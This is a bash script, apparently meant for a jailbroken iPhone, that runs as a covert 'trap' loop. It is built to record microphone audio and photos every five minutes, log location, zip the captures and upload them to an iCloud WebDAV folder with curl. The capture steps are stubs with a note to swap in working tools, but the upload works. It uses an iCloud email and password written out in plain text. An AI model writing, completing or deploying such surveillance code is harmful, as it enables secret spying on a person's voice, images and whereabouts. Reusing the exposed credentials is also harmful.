#!/bin/bash
LOG="/var/root/trap.log"
SNAPDIR="/var/root/trap-snaps"
UPLOAD_DIR="/var/root/trap-upload"
ZIP_DIR="/var/root/zipped-logs"
mkdir -p "$SNAPDIR" "$UPLOAD_DIR" "$ZIP_DIR"

ICLOUD_EMAIL="infinitelyenlighten@icloud.com"
ICLOUD_PASS="nfhj-cryh-awrf-ezgf"

while true; do
  TIMESTAMP=$(date +%s)

  ## 🎙️ Mic capture every 5 min (mock - replace with working tool on jailbroken target)
  AUDIO_FILE="$UPLOAD_DIR/audio_${TIMESTAMP}.m4a"
  touch "$AUDIO_FILE"

  ## 📸 Photo snap (mock)
  PHOTO_FILE="$UPLOAD_DIR/photo_${TIMESTAMP}.jpg"
  touch "$PHOTO_FILE"

  ## 🛰️ GPS spoof detection (mock)
  echo "$(date): Real GPS: 37.7749,-122.4194 | Claimed: 0.0000,0.0000" >> "$LOG"

  ## 🧠 Activity log
  echo "$(date): Heartbeat OK" >> "$LOG"

  ## 🧼 Bundle new log + captures
  cp "$LOG" "$UPLOAD_DIR/log_${TIMESTAMP}.txt"

  ## 📦 Zip and upload every 15 min
  if (( TIMESTAMP % 900 < 10 )); then
    ZIPFILE="$ZIP_DIR/trap_${TIMESTAMP}.zip"
    zip -r "$ZIPFILE" "$UPLOAD_DIR" >/dev/null 2>&1

    curl -T "$ZIPFILE" -u "$ICLOUD_EMAIL:$ICLOUD_PASS" https://webdav.icloud.com/Logs/ || true
  fi

  sleep 300  # every 5 minutes
done

